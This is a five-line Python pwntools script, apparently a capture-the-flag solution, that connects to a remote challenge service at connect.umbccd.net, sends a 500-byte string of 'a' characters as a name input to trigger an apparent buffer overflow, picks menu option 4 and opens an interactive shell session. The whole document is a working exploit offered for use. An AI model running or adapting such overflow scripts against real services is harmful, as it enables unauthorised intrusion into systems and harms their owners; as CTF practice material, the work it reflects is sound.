from pwn import *
p=remote("connect.umbccd.net",25699)
p.sendlineafter(b'name: ',b'a'*500)
p.sendlineafter(b'choice: ',b'4')
p.interactive()
